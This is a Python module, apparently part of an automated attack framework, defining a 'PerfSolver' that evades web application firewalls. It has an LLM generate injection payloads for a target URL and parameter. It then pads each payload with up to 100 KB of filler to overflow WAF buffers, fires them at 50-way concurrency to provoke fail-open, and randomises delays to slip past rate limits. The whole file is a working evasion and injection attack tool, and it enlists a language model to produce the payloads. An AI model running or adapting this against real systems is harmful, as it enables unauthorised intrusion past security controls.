from __future__ import annotations

import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote

import requests

from agents.models import SolverRequest, RawResponse
from agents.solver_engines.base import SolverEngine
from llm_engine import _chat_json


class PerfSolver(SolverEngine):
    """性能层绕过：超大 Padding、高并发 Race、请求间隔随机化。"""

    def __init__(self, concurrency: int = 50, timeout: int = 15, padding_size: int = 102400, model: str = "mimo-v2.5-pro"):
        self.concurrency = concurrency
        self.timeout = timeout
        self.padding_size = padding_size
        self.model = model

    def generate(self, request: SolverRequest) -> list[str]:
        """生成带 Padding 的 payload + 高并发变体。"""
        base_payloads = self._get_base_payloads(request)
        padded = []
        for p in base_payloads:
            # Padding 变体：前置无害字符撑爆 WAF 缓冲区
            padding = "A" * self.padding_size
            padded.append(f"{padding}{p}")
            # 短 Padding 变体
            padded.append(f"{'A' * 1024}{p}")
        return padded

    def _get_base_payloads(self, request: SolverRequest) -> list[str]:
        """获取基础 payload（从语义层借入或 LLM 生成）。"""
        prompt = f"""生成 5 个 {request.target.vuln_type} 基础 payload，用于性能层 Padding 攻击。
目标: {request.target.url}，参数: {request.target.param}
返回 JSON：{{"payloads": ["p1", "p2", ...]}}"""
        result = _chat_json(prompt, model=self.model, temperature=0.5, max_tokens=512)
        if isinstance(result, dict):
            return result.get("payloads", [])
        return []

    def send(self, payloads: list[str], request: SolverRequest) -> list[RawResponse]:
        """高并发发包，尝试触发 WAF Fail-Open。"""
        results: list[RawResponse] = []
        session = requests.Session()
        session.trust_env = False

        effective_concurrency = min(self.concurrency, len(payloads))

        with ThreadPoolExecutor(max_workers=effective_concurrency) as executor:
            futures = {
                executor.submit(self._send_single, p, request, session): p
                for p in payloads
            }
            for fut in as_completed(futures):
                try:
                    results.append(fut.result())
                except Exception:
                    results.append(RawResponse(
                        payload=futures[fut], status_code=0,
                        headers={}, body="", elapsed_ms=0, dimension="performance",
                    ))
        return results

    def _send_single(self, payload: str, request: SolverRequest, session: requests.Session) -> RawResponse:
        target = request.target
        start = time.monotonic()

        # 随机延迟（绕过速率限制）
        time.sleep(random.uniform(0, 0.5))

        if target.method.upper() == "GET":
            params = {k: v.replace("{{INJECT}}", payload) for k, v in (target.params or {}).items()}
            resp = session.get(target.url, params=params, headers=target.headers, timeout=self.timeout, allow_redirects=False)
        else:
            body = (target.body or "").replace("{{INJECT}}", quote(payload, safe="%"))
            resp = session.post(target.url, data=body, headers=target.headers, timeout=self.timeout, allow_redirects=False)

        elapsed = int((time.monotonic() - start) * 1000)
        return RawResponse(
            payload=payload, status_code=resp.status_code,
            headers=dict(resp.headers), body=resp.text[:50000],
            elapsed_ms=elapsed, dimension="performance",
        )
